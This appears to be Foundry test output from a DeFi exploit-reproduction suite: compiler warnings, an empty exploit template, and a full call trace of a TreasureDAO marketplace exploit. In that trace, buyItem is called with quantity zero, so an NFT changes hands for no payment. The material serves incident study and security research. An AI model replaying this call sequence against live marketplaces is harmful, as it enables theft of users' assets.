Compiling 26 files with Solc 0.8.25
Compiling 25 files with Solc 0.8.10
Solc 0.8.10 finished in 970.94ms
Solc 0.8.25 finished in 1.14s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 374.90ms (113.13µs CPU time)

Ran 1 test for src/test/2022-03/TreasureDAO_exp.sol:ContractTest
[PASS] testExploit() (gas: 336639)
Logs:
  Original NFT owner of SmolBrain:: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165
  Exploit completed, NFT owner of SmolBrain:: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496

Traces:
  [388839] ContractTest::testExploit()
    ├─ [2668] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::ownerOf(3557) [staticcall]
    │   └─ ← [Return] 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165
    ├─ emit log_named_address(key: "Original NFT owner of SmolBrain:", val: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165)
    ├─ [346128] 0x812cdA2181ed7c45a35a691E0C85E231D218E273::buyItem(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0, 6969000000000000000000 [6.969e21])
    │   ├─ [7061] 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee::listings(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000179ca4da0a7d14400000000000000000000000000000000000000000000000000000000017ee748ff2c
    │   ├─ [2350] 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee::paymentToken() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000539bde0d7dbd336b79148aa742883198bbf60342
    │   ├─ [22271] 0x539bdE0d7Dbd336b79148AA742883198BBF60342::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0)
    │   │   ├─ [2337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   │   ├─ [12128] 0x3f770Ac673856F105b586bb393d122721265aD46::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0) [delegatecall]
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, value: 0)
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, value: 0)
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [350] 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee::paymentToken() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000539bde0d7dbd336b79148aa742883198bbf60342
    │   ├─ [5802] 0x539bdE0d7Dbd336b79148AA742883198BBF60342::approve(0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, 0)
    │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   │   ├─ [4662] 0x3f770Ac673856F105b586bb393d122721265aD46::approve(0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, 0) [delegatecall]
    │   │   │   ├─ emit Approval(owner: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, spender: 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, value: 0)
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [224098] 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee::buyItem(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0)
    │   │   ├─ [632] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::supportsInterface(0x80ac58cd) [staticcall]
    │   │   │   └─ ← [Return] true
    │   │   ├─ [668] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::ownerOf(3557) [staticcall]
    │   │   │   └─ ← [Return] 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165
    │   │   ├─ [632] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::supportsInterface(0x80ac58cd) [staticcall]
    │   │   │   └─ ← [Return] true
    │   │   ├─ [127843] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::safeTransferFrom(0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0x812cdA2181ed7c45a35a691E0C85E231D218E273, 3557)
    │   │   │   ├─ [2538] 0x602e50Ed10A90D324b35930EC0F8E5D3b28cD509::isAtSchool(3557) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [8113] 0xCca920553ccc9aca80919e614325167d9Ec37b4A::tokenOfOwnerByIndex(0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0) [staticcall]
    │   │   │   │   ├─ [2657] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::balanceOf(0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [31747] 0xCca920553ccc9aca80919e614325167d9Ec37b4A::upgradeSafe(0)
    │   │   │   │   ├─ [2338] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::totalSupply() [staticcall]
    │   │   │   │   │   └─ ← [Return] 4294
    │   │   │   │   ├─ [27839] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::upgradeSafe(0)
    │   │   │   │   │   ├─ [2723] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::balanceOf(0x59D16389335147E034aA1238cA043Cba907f79Dd) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [12303] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::averageIQ() [staticcall]
    │   │   │   │   │   │   ├─ [9101] 0x602e50Ed10A90D324b35930EC0F8E5D3b28cD509::totalIQ() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000005712901ea29294f3ebab4
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001dff8c484f43bf78eb
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ emit Approval(_owner: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, _approved: 0x0000000000000000000000000000000000000000, _tokenId: 3557)
    │   │   │   ├─ emit Transfer(_from: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, _to: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, _tokenId: 3557)
    │   │   │   ├─ [927] 0x812cdA2181ed7c45a35a691E0C85E231D218E273::onERC721Received(0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 3557, 0x)
    │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit ItemSold(: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, : 0x812cdA2181ed7c45a35a691E0C85E231D218E273, : 0x6325439389E0797Ab35752B4F43a14C004f22A9c, : 3557, : 0, : 6969000000000000000000 [6.969e21])
    │   │   ├─ [49236] 0xb40BC8bF5f4dF00B0b32C56E8d3Ecd802656cCe4::reportSale(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, 0x539bdE0d7Dbd336b79148AA742883198BBF60342, 6969000000000000000000 [6.969e21])
    │   │   │   ├─ emit PriceUpdate(param0: 0x6325439389E0797Ab35752B4F43a14C004f22A9c, param1: 477322193002434434342397814992046308891884389186 [4.773e47], param2: 0x0000000000000000000000000000000000000dE5, param3: 6969000000000000000000 [6.969e21])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [9271] 0x539bdE0d7Dbd336b79148AA742883198BBF60342::transferFrom(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0xDb6Ab450178bAbCf0e467c1F3B436050d907E233, 0)
    │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   │   │   ├─ [8128] 0x3f770Ac673856F105b586bb393d122721265aD46::transferFrom(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0xDb6Ab450178bAbCf0e467c1F3B436050d907E233, 0) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, to: 0xDb6Ab450178bAbCf0e467c1F3B436050d907E233, value: 0)
    │   │   │   │   ├─ emit Approval(owner: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, spender: 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [9271] 0x539bdE0d7Dbd336b79148AA742883198BBF60342::transferFrom(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0)
    │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   │   │   ├─ [8128] 0x3f770Ac673856F105b586bb393d122721265aD46::transferFrom(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, to: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, value: 0)
    │   │   │   │   ├─ emit Approval(owner: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, spender: 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [632] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::supportsInterface(0x80ac58cd) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [69048] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::safeTransferFrom(0x812cdA2181ed7c45a35a691E0C85E231D218E273, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3557)
    │   │   ├─ [538] 0x602e50Ed10A90D324b35930EC0F8E5D3b28cD509::isAtSchool(3557) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [3613] 0xCca920553ccc9aca80919e614325167d9Ec37b4A::tokenOfOwnerByIndex(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0) [staticcall]
    │   │   │   ├─ [2657] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::balanceOf(0x812cdA2181ed7c45a35a691E0C85E231D218E273) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [7747] 0xCca920553ccc9aca80919e614325167d9Ec37b4A::upgradeSafe(0)
    │   │   │   ├─ [338] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 4294
    │   │   │   ├─ [5839] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::upgradeSafe(0)
    │   │   │   │   ├─ [723] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::balanceOf(0x59D16389335147E034aA1238cA043Cba907f79Dd) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [2303] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::averageIQ() [staticcall]
    │   │   │   │   │   ├─ [1101] 0x602e50Ed10A90D324b35930EC0F8E5D3b28cD509::totalIQ() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000005712901ea29294f3ebab4
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001dff8c484f43bf78eb
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ emit Approval(_owner: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, _approved: 0x0000000000000000000000000000000000000000, _tokenId: 3557)
    │   │   ├─ emit Transfer(_from: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 3557)
    │   │   ├─ [872] ContractTest::onERC721Received(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0x812cdA2181ed7c45a35a691E0C85E231D218E273, 3557, 0x)
    │   │   │   └─ ← [Return] 0x150b7a02
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [668] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::ownerOf(3557) [staticcall]
    │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    ├─ emit log_named_address(key: "Exploit completed, NFT owner of SmolBrain:", val: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 404.33ms (4.64ms CPU time)

Ran 2 test suites in 736.23ms (779.23ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
